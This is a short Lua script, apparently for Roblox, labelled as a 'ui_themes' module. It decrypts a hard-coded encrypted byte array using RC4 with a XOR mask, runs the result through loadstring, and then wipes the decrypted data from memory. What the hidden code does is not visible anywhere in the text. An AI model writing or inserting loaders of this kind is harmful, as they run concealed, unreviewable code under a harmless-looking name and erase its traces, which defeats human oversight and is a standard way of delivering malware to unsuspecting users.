-- Protected Segment (ui_themes)
local BDsXmZJT = 154
local uMnwXjzM = {
{72,241,167,229,209,80,163,46,204,131,150,118,220,140,14,250,55,105,135,254,169,57,189,193,174,5,45,74,132,97,240,58,109,48,34,245,93,247,39,229,214,27,5,81,128,78,76,235,253,48,218,45,116,95,203,115,103,22,15,109},{220,57,3,115,186,166,131,235,16,200,158,39,136,179,219,83,86,216,131,118,151,212,145,209,207,234,99,20,90,113,28,213,145,1,24,210,243,179,157,26,14,43,158,248,110,177,211,23,166,96,134,28,28,239,174,184,203,155,44,107},{190,219,228,95,57,20,238,113,32,183,230,195,182,0,159,180,250,247,96,96,25}
}
local bCrQFsDy = "ebdRBEjuTCwMFtLw"

local function iKALZHBT(bBMIFUSS_data, bBMIFUSS_key)
    if type(bBMIFUSS_key) ~= "string" or #bBMIFUSS_key == 0 then return "" end
    local bBMIFUSS = {}
    for ACBcFVca = 0, 255 do bBMIFUSS[ACBcFVca] = ACBcFVca end
    local djXyfeUC = 0
    for ACBcFVca = 0, 255 do
        local PMnDoCYo = bBMIFUSS_key:byte((ACBcFVca % #bBMIFUSS_key) + 1)
        djXyfeUC = (djXyfeUC + bBMIFUSS[ACBcFVca] + PMnDoCYo) % 256
        bBMIFUSS[ACBcFVca], bBMIFUSS[djXyfeUC] = bBMIFUSS[djXyfeUC], bBMIFUSS[ACBcFVca]
    end
    local ACBcFVca = 0
    local djXyfeUC = 0
    local yOXgXUGE = {}
    for _, mUnLSdvB in ipairs(bBMIFUSS_data) do
        ACBcFVca = (ACBcFVca + 1) % 256
        djXyfeUC = (djXyfeUC + bBMIFUSS[ACBcFVca]) % 256
        bBMIFUSS[ACBcFVca], bBMIFUSS[djXyfeUC] = bBMIFUSS[djXyfeUC], bBMIFUSS[ACBcFVca]
        local PMnDoCYo = bBMIFUSS[(bBMIFUSS[ACBcFVca] + bBMIFUSS[djXyfeUC]) % 256]
        local unmasked = bit32.bxor(mUnLSdvB, BDsXmZJT)
        table.insert(yOXgXUGE, string.char(bit32.bxor(unmasked, PMnDoCYo)))
    end
    return table.concat(yOXgXUGE)
end

local bBMIFUSS_flat = {}
for _, chunk in ipairs(uMnwXjzM) do
    for _, byte in ipairs(chunk) do
        table.insert(bBMIFUSS_flat, byte)
    end
end

local decrypted = iKALZHBT(bBMIFUSS_flat, bCrQFsDy)
local MmVXerru, hXFsBFkk = loadstring(decrypted)

-- Immediate Memory Sanitation: Overwrite decrypted variables
table.clear(bBMIFUSS_flat)
bBMIFUSS_flat = nil

if MmVXerru then 
    local result = MmVXerru() 
    decrypted = nil
    MmVXerru = nil
    return result
else 
    decrypted = nil
    warn("[ecco] Boot Error (" .. "ui_themes" .. "): " .. tostring(hXFsBFkk)) 
end
